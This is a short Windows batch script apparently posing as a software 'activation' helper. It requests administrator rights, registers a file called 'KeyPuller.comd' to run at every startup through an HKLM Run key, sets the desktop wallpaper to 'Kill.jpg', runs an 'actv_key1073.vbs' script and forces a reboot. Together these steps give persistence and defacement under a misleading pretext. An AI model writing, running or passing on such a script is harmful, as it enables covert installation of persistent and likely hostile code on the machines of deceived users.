@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "KeyPuller" /t REG_SZ /F /D "C:\Users\%Username%\Desktop\Activation\scr\KeyPuller.comd"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  C:\Users\%Username%\Desktop\Activation\scr\Kill.jpg /f
cd C:\Users\%username%\desktop\activation\scr
actv_key1073.vbs

Shutdown /r